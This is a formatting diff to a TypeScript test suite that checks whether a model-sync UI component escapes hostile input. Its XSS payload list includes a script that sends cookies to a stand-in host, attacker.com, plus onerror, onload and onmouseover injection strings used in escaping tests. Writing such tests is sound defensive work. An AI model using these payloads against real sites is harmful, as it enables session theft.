@@ -88,11 +88,13 @@ interface MicroStateOverrides {
   } | null;
 }
 
-const internals = (React as unknown as {
-  __CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: {
-    H: { useState: (initial: unknown) => [unknown, (v: unknown) => void] };
-  };
-}).__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
+const internals = (
+  React as unknown as {
+    __CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: {
+      H: { useState: (initial: unknown) => [unknown, (v: unknown) => void] };
+    };
+  }
+).__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
 
 function renderWithInjectedState(
   overrides?: MicroStateOverrides,
@@ -102,7 +104,9 @@ function renderWithInjectedState(
     searchParams?: string;
   }
 ): string {
-  currentSearchParams = new URLSearchParams(customProps?.searchParams ?? "tab=sync");
+  currentSearchParams = new URLSearchParams(
+    customProps?.searchParams ?? "tab=sync"
+  );
 
   if (!overrides || Object.keys(overrides).length === 0) {
     return renderToStaticMarkup(
@@ -157,12 +161,12 @@ describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () =
   describe("Dimension 1: XSS Injection Payloads", () => {
     const xssPayloads = [
       '<script>alert("XSS")</script>',
-      '<img src=x onerror="javascript:alert(\'pwned\')">',
-      '<svg onload=alert(document.domain)>',
+      "<img src=x onerror=\"javascript:alert('pwned')\">",
+      "<svg onload=alert(document.domain)>",
       '"><script>document.location="http://attacker.com/?cookie="+document.cookie</script>',
-      'javascript:alert(1)',
+      "javascript:alert(1)",
       '<a href="javascript:alert(1)">Click Me</a>',
-      '${7*7}{{7*7}}',
+      "${7*7}{{7*7}}",
     ];
 
     it("verifies all XSS payloads in model IDs and error notifications are strictly entity-escaped", () => {
@@ -203,7 +207,8 @@ describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () =
     });
 
     it("verifies error alert banner escapes malicious HTML tags when syncResult has an error", () => {
-      const maliciousError = 'Upstream crash: <b onmouseover=alert(1)>malicious text</b> & "quoted" \'tags\'';
+      const maliciousError =
+        "Upstream crash: <b onmouseover=alert(1)>malicious text</b> & \"quoted\" 'tags'";
       const html = renderWithInjectedState({
         syncResult: {
           success: false,
@@ -218,7 +223,9 @@ describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () =
       });
 
       expect(html).not.toContain("<b onmouseover=alert(1)>");
-      expect(html).toContain("&lt;b onmouseover=alert(1)&gt;malicious text&lt;/b&gt;");
+      expect(html).toContain(
+        "&lt;b onmouseover=alert(1)&gt;malicious text&lt;/b&gt;"
+      );
       expect(html).toContain("&amp; &quot;quoted&quot; &#x27;tags&#x27;");
     });
   });
@@ -249,7 +256,11 @@ describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () =
           diff: {
             newModels: [
               { id: "target-model-alpha", object: "model", owned_by: "openai" },
-              { id: "target-model-beta", object: "model", owned_by: "anthropic" },
+              {
+                id: "target-model-beta",
+                object: "model",
+                owned_by: "anthropic",
+              },
             ],
             syncedModels: [],
             missingUpstreamModels: [],
@@ -325,8 +336,13 @@ describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () =
         console.log("Component rendered without crashing even with diff: null");
       } catch (err) {
         const error = err as Error;
-        console.log("Observed crash with malformed diff: null ->", error.message);
-        expect(error.message).toMatch(/(Cannot read properties of null|null is not an object)/);
+        console.log(
+          "Observed crash with malformed diff: null ->",
+          error.message
+        );
+        expect(error.message).toMatch(
+          /(Cannot read properties of null|null is not an object)/
+        );
       }
     });
   });
